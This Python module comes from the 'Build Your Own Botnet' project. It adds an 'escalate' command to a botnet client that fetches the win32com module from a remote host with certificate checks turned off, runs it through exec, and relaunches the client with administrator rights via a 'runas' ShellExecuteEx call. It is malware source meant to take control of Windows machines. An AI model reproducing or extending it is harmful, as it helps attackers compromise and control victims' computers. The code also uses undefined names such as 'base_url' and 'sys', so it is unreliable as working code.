#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library

import os

# remote imports

import httpimport

httpimport.INSECURE = True

with httpimport.remote_repo(['win32com'], base_url):
    for module in ['win32com.shell.shell']:
        try:
            exec "import %s" % module in globals()
            print("%s imported successfully." % module)
        except ImportError:
            print("%s import failed." % module)

# byob

import util


           
@util.config(platforms=['win32'], command=True, usage='escalate')
def escalate(self):
    """
    attempt to escalate privileges
    """
    try:
        if util.administrator():
            return "Current user '{}' has administrator privileges".format(self.info.get('username'))
        if os.name is 'nt':
            win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self.clients.get('result')))
        else:
            return "Privilege escalation not yet available on '{}'".format(sys.platform)
    except Exception as e:
        util.debug("{} error: {}".format(self.escalate.func_name, str(e)))
